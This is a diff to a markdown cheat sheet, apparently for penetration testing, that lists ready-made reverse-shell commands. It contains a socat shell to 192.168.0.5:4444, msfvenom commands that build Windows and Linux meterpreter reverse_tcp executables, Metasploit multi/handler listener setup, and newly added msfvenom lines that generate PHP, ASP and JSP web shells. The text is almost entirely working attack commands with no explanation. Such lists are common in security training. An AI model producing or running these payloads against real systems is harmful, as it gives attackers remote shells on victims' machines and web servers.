@@ -26,25 +26,28 @@ socat tcp-connect:192.168.0.5:4444 system:/bin/sh
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f exe -o shell_reverse.exe
+
 //attacker machine
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 ```
 
-### Windows meterpreter non-staged payload
+#### Windows meterpreter non-staged payload
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
+
 //attacker machine
 use exploit/multi/handler
 set payload windows/shell_reverse_tcp
 
 ```
 
-### Windows meterpreter staged payload
+#### Windows meterpreter staged payload
 
 ```
 msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe
+
 //attacker machine
 use exploit/multi/handler
 set payload windows/shell/reverse_tcp
@@ -54,7 +57,25 @@ set payload windows/shell/reverse_tcp
 ### Linux
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
+
 //attacker machine
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
+```
+
+### Meterpreter Web Payloads
+
+#### PHP
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+```
+
+#### ASP
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+```
+
+#### JSP
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
 ```
